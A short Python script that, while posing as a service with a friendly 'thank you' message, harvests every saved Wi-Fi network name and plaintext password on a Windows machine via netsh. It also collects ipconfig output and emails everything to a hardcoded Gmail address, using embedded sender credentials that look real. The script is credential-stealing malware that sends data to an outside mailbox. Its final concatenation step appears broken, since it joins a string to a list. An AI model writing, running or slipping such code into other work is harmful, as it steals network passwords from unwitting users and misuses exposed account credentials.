def main():
    import subprocess,smtplib
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    from email.mime.base import MIMEBase
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
    cd={}
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    for i in profiles:
        try:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
        except subprocess.CalledProcessError:
            continue
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        try:
            ae=i
            be=results[0]
        except IndexError:
            ae=i
            be=0
        if be:
            cd[str(ae)]=str(be)
    mail_content = ','.join(cd.keys())+'\n\n\n'+','.join(cd.values())+'\n\n\n'+subprocess.check_output(['ipconfig']).decode('utf-8').split('\n')
    sender_address = 'cvmuntest@gmail.com'
    sender_pass = 'ikihihaojprfbsyo'
    receiver_address = 'anirudhnfs01@gmail.com'
    message = MIMEMultipart()
    message['From'] = sender_address
    message['To'] = receiver_address
    message['Subject'] = 'wifi'
    message.attach(MIMEText(mail_content, 'plain'))
    session = smtplib.SMTP('smtp.gmail.com', 587)
    session.starttls()
    session.login(sender_address, sender_pass)
    text = message.as_string()
    session.sendmail(sender_address, receiver_address, text)
    session.quit()
    input('[*] press any key to quit')
    print('[*] Thank you for using our service')
main()
